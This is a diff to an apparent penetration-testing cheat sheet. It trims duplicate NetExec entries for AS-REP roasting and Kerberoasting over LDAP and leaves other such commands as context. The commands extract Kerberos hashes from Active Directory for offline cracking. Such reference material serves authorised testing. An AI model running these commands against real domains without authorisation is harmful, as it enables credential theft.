@@ -1084,36 +1084,12 @@ Kerberoast using AS-REP roastable accounts.
 nxc ldap <ip> -u <user> -p '<password>' --no-preauth-targets <userfile> --kerberoasting <output_file>
 ```
 
-## nxc - ASREPRoast without authentication
-AS-REP roast without valid credentials.
-
-#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
-```bash
-nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file>
-```
-
-## nxc - ASREPRoast with user list
-Test multiple users for AS-REP roasting.
-
-#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
-```bash
-nxc ldap <ip> -u <userfile> -p '<password>' --asreproast <output_file>
-```
-
 ## nxc - ASREPRoast with authentication
 Extract AS-REP hashes with valid credentials.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
 ```bash
 nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file>
-```
-
-## nxc - ASREPRoast with kdcHost
-AS-REP roast with explicit KDC server.
-
-#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
-```bash
-nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file> --kdcHost <domain>
 ```
 
 ### Domain Information
@@ -2323,14 +2299,6 @@ AS-REP roast without valid credentials.
 #platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
 nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file> --kdcHost <dc_ip>
-```
-
-## nxc - Kerberoast with kdcHost
-Kerberoast specifying KDC hostname.
-
-#platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
-```bash
-nxc ldap <ip> -u <user> -p '<password>' --kerberoasting <output_file> --kdcHost <dc_ip>
 ```
 
 ## nxc - enumerate unconstrained delegation
